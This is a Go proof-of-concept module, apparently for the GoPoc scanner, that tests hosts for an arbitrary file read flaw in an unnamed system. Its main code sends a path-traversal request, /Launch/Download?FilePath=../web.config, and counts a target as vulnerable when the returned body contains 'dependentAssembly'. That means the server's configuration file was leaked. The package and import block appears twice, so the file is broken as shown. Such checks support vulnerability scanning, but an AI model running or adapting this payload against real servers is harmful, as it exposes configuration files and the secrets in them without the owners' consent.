package User

import (
	Format "GoPoc/main/Developer/AllFormat"
	"GoPoc/main/Developer/HttpAbout"
	"GoPoc/main/User/Utils"
	"strings"
)

package User

import (
"GoPoc/main/Developer/AllFormat"
"GoPoc/main/Developer/HttpAbout"
"GoPoc/main/User/Utils"
"strings"
)

var Json string
var Poc func(hostInfo string) bool
var Exp func(expResult Format.ExpResult) Format.ExpResult

// 为避嫌, fofa语句乱填的
func init() {
	Json = `{
	"VulnName":"某系统任意文件读取漏洞",
	"CheckIP":"true",
	"Coroutine":"10",
	"File":"",
    "Fofa":"product=\"xxx\"",
 	"Url":"",
   "Request":{

		"Method": "",

		"Uri": [
	   			],

		"Header":{
			"Accept-Encoding":"gzip"
		}
	},

   "Response":{

		"Operation":"",

		"Group":[

				{

                    "Regexp": "",
			        "Header":{
			            },

			        "Body":[
			            ]
			    },

          		 {
			        "Header":{
			            }
			    }
			]

}
}`

	// 发送探测包
	sendDetectionPath455445 := func(hostInfo string) (Format.CustomResponseFormat, error) {
		config := HttpAbout.NewHttpConfig()		// 未指定请求方法则默认GET
		config.Uri = "/Launch/Download?FilePath=../web.config"
		Utils.FullyAutomaticFillingHeader(config, `GET http://127.0.0.1 HTTP/1.1
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.10) Gecko/2009042523 Linux Mint/6 (Felicia) Firefox/3.0.10
Host: 127.0.0.1
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close`)	// 挂代理抓个包扔进来这个方法,将自动给请求头赋值(除了Host/UA,Host自动修改为hostInfo,UA不指定会自动生成),不用再手动一个个添加请求头
		return HttpAbout.SendHttpRequest(hostInfo, config)
	}

	// 如果使用代码模式, Poc函数为必须,其中的参数固定
	Poc = func(hostInfo string) bool {
		resp, err := sendDetectionPath455445(hostInfo)
		if err != nil {
			return false
		}
		if !strings.Contains(resp.Status, "200") {	// 如果响应码不包含 200 字样,则返回 false
			return false
		}
		return strings.Contains(resp.Body, "dependentAssembly")	// 如果响应包包含 dependentAssembly 字样,则返回 true
	}

	// 如果使用代码模式, Exp函数为必须,其中的参数固定
	// Exp 你可以尝试自己写一下:
	Exp = func(expResult Format.ExpResult) Format.ExpResult {
		return expResult
	}
}
